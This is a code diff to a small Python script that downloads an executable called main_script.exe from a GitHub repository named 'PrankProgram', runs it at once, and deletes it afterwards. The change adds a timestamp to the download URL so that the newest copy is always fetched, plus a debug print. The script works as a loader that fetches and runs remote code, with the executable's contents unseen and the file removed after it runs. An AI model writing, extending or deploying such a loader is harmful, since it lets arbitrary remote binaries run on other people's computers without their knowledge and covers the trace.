@@ -1,4 +1,4 @@
-import requests,subprocess, os
+import requests,subprocess, os, time
 
 
 try:
@@ -21,7 +21,7 @@ def start():
     }
 
     url_content = requests.get(
-        "https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe",
+        f"https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe?ts={int(time.time())}",
         headers=headers,
         )
 
@@ -32,6 +32,7 @@ def start():
 
     directory = os.path.abspath(filename)
     print(f"----> {directory}")
+    print(time.time())
     subprocess.run([directory])
     os.remove(filename)
 
